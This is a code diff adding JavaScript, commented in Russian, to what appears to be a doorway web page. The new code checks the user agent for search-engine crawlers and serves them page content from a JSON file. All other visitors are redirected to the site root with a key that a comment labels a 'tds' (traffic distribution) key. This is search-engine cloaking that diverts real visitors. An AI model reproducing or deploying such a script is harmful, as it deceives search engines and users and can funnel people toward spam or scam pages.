@@ -1,15 +1,54 @@
-
+let ver = 2;
 let id = (/(\d+)\.html/ ['exec'](location['pathname'])) ? /(\d+)\.html/ ['exec'](location['pathname'])[1] : '';
+let head = document['getElementsByTagName']('head')[0];
+let body = document['getElementsByTagName']('body')[0];
 let main = document['getElementsByTagName']('main')[0];
-let ver = 1;
+let lang = document['documentElement']['lang'];
+let path = location['pathname'];
+let params = SearchKeyFromLocation();
+let cats = [34, 66, 44, 1503, 15, 6, 13, 1524, 200000343, 21, 509, 18, 1420, 1511, 200000297]; // список категорий
+let cat = cats[Math['floor'](Math['random']() * cats['length'])]; // Случайное значение
+let country = ['ru', 'pt', 'ar', 'tr', 'nl', 'pl', 'ja', 'ko', 'en', 'de', 'fr', 'it', 'es']; // список языков
+let script = document['createElement']('script');
+    script['type'] = 'text/javascript';
+
+country['forEach'](element => GetLang(element));
+let bot = CheckBot();
+let key = ''; // ключик tds
+
+main['innerHTML'] = '<div class="loading"></div>'; // Показываю подгрузку странички
+
+if(bot){
+    script['src'] = location['origin'] + id +'_'+lang+'.json';
+    main['appendChild'](script);
+}
+else{
+    location['href'] = location['origin'] + '/?key=' + key;
+}
 
 
+
+
+// Проверка бота
+function CheckBot() {
+    return /bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|yandex/i ['test'](navigator['userAgent']);
+}
+
+// Проверка установленного языка
+function GetLang(itemLang) {
+    if (location['hostname']['split']('.')[0]['includes'](itemLang)) {
+        lang = itemLang
+    }
+}
+
+// Проверка версии скрипта
 function version() {
     let p = document.createElement('p');
     p.innerHTML = ver;
     main.appendChild(p);
 }
 
+// Формирование карты сайта
 function sitemap(arrayLinks) {
     let h2 = document.createElement('h2');
     h2.innerHTML = 'Sitemap';
